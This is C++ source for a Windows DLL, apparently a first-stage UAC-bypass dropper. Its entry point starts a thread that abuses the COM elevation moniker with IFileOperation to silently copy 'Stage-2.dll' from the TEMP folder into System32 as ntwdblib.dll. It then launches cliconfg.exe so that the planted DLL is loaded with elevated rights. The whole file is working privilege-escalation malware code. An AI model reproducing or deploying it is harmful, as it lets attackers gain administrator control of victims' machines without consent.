// dllmain.cpp : Define el punto de entrada de la aplicación DLL.
#include "stdafx.h"
#include <windows.h>
#include <string>
//IMPORTANT: Dlls are very 'sensible' to standard stuff (std::), so using native windows api is recommended
#include <Shobjidl.h>//COM interface
#include <Shellapi.h>//FOF_NO_UI FLAG
//Still don't know how to import functions used by the dll from another file

HRESULT CopyItem(__in LPCWSTR pszSrcItem, __in LPCWSTR pszDest, LPCWSTR pszNewName)
{
	//
	// Initialize COM as STA.
	//
	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	if (SUCCEEDED(hr))
	{
		IFileOperation *pfo = NULL;
		// Create an IShellItem from the supplied source path.
		IShellItem *psiFrom = NULL;
		IShellItem *psiTo = NULL;

		BIND_OPTS3 bopts;
		ZeroMemory(&bopts, sizeof(bopts));
		bopts.cbStruct = sizeof(bopts);
		bopts.hwnd = NULL;
		bopts.grfMode = STGM_READWRITE;
		bopts.dwClassContext = CLSCTX_LOCAL_SERVER;
		//Binds COM Elevation Moniker with IFileOperation 
		hr = CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", &bopts, IID_PPV_ARGS(&pfo));

		// Create the IFileOperation interface 
		//
		hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pfo));
		if (SUCCEEDED(hr))
		{
			// Set the operation flags. Turn off all UI from being shown to the
			// user during the operation. This includes error, confirmation,
			// and progress dialogs.
			//
			hr = pfo->SetOperationFlags(FOF_NO_UI | FOFX_REQUIREELEVATION | FOFX_NOCOPYHOOKS); //Flags thanks to kub0x
			if (SUCCEEDED(hr))
			{

				hr = SHCreateItemFromParsingName(pszSrcItem, NULL, IID_PPV_ARGS(&psiFrom));
				if (SUCCEEDED(hr))
				{


					if (NULL != pszDest)
					{

						hr = SHCreateItemFromParsingName(pszDest, NULL, IID_PPV_ARGS(&psiTo));
					}

					if (SUCCEEDED(hr))
					{

						// Add the operation
						hr = pfo->CopyItem(psiFrom, psiTo, pszNewName, NULL);

						if (NULL != psiTo)
						{
							psiTo->Release();
						}

					}

					psiFrom->Release();
				}

				if (SUCCEEDED(hr))
				{
					// Perform the operation to copy the file.
					hr = pfo->PerformOperations();
				}
			}

			// Release the IFileOperation interface.
			pfo->Release();
		}

		CoUninitialize();
	}
	return hr;
}


int haxproc()
{
	//IMPORTANT: This is an unicode dll
	//Resolve %TEMP% path
	wchar_t* source;
	source = _wgetenv(L"TEMP");
	wcscat(source, L"\\Stage-2.dll");
	LPCWSTR temp = source;
	//std::wstring str(source);
	//LPCWSTR temp = str.c_str();
	//MessageBox(0, temp, 0, 0);

	//Calls the COM interface to copy the stage 2 dll to the Windows path //C:\\Windows\\System32
	HRESULT test = CopyItem(temp, L"C:\\Windows\\System32", L"ntwdblib.dll"); //Resolve the windows path it may not be in C:

	if (SUCCEEDED(test))
	{
		MessageBox(0, L"Stage-2 Installed", 0, 0);
	}
	else
	{
		MessageBox(0, L"Stage-2 Not Installed", 0, 0);
		Sleep(1000);
		return true; //end
	}

	HINSTANCE res = ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\cliconfg.exe", NULL, NULL, 3);//hm fix this

	if ((int)res>32)
	{
		MessageBox(0, L"Cliconfg Started", 0, 0);
	}
	else
	{
		MessageBox(0, L"Cliconfg Couldn't Start", 0, 0);
		Sleep(1000);
		return true;
	}



	return 0;
}



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)haxproc, NULL, 0, 0);
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

